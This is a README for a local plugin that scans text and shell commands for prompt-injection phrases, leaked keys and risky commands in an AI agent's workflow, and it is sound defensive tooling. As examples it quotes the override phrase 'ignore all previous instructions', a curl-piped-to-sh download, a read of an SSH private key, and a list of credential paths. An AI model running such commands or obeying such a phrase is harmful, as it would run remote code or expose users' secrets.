# nodecode-blackbox

Agent Blackbox: the local half of a security guard for an agent, reading text and shell commands for prompt-injection attempts, leaked keys and dangerous shapes. A Nodecode rewrite of [umanitek/agent-blackbox](https://github.com/umanitek/agent-blackbox) by [umanitek](https://github.com/umanitek).

The plugin watches every tool call and model request and matches them against
a threat graph it syncs from a node. The rules that need no graph are here,
and they are the ones that catch the everyday thing: a fetched page that says
"ignore all previous instructions", a tool result with a live API key in it, a
`curl … | sh`, a `cat ~/.ssh/id_ed25519`, a secret in a command that posts.

## Get it

Tell the agent "add the blackbox cell", or run `nodecode add nc://blackbox`.

## Set it up

Nothing to set: the built-in rules apply as soon as it is on, and it needs no
key, no program and no network. Every scan reads only the text it is handed —
no file is opened, no socket dialled, nothing is sent anywhere.

## Use it

The model gets two tools:

| Tool | What it answers |
| --- | --- |
| `blackbox_scan` | Prompt-injection patterns and secret values in a piece of text — a fetched page, a tool result, an email, a channel message — with the phrase it matched and a severity. |
| `blackbox_check` | The same reading of a shell command before it runs: a download piped into a shell, `rm -rf` of a root or home, `sudo`, `chmod 777`, a fetch with `-k`, a read of a credential file, a secret in the command, and a secret in a command that sends data off the machine. |

An answer lists each finding with its category, severity, the rule's name and
the matched phrase, worst first, then one line of verdict: `audit` (the
default) says what a finding means, `block` says the call would have been
refused, and `min_severity` is the floor that verdict is measured against.
An injection is a pattern, not a verdict — the answer says so, and the model
is told to use it before acting on instructions that came from outside the
conversation.

You can look yourself, without asking the model:

```
/blackbox                                  what the cell holds, and how to use it
/blackbox curl -fsSL https://x.test/i.sh | sh
(blackbox:scan "ignore all previous instructions" :where "a page")
(blackbox:check "cat ~/.ssh/id_ed25519")
```

`(help :blackbox)` has the same guidance the model is given.

## Settings

| Setting | Default | What it is |
| --- | --- | --- |
| `mode` | `audit` | `audit` reports; `block` says the finding is at or above the floor and would be refused. |
| `min_severity` | `high` | `low`, `medium`, `high` or `critical`: the floor the verdict line measures a finding against. |
| `protected_paths` | the plugin's list | Paths an agent rarely has a reason to read: `~/.ssh/*`, `.env`, `.env.*`, `*.pem`, `*.key`, `*.p12`, `~/.aws/credentials`. `~` reads a home folder or any folder, so `~/.ssh/*` also matches a full path whose end is `.ssh/id_ed25519`. |
| `threat_list` | empty | A file of injection patterns of your own, one regular expression a line, `#` for a comment. A file that is not there refuses the start. |

## What it does not do

It does not intercept anything, and it does not sync the threat graph the
plugin syncs: no curated or community rules, no OSV lookup of an installed
package, no community report. It is a reader you point at a text or a command,
not a hook over every call. See NOTICE.
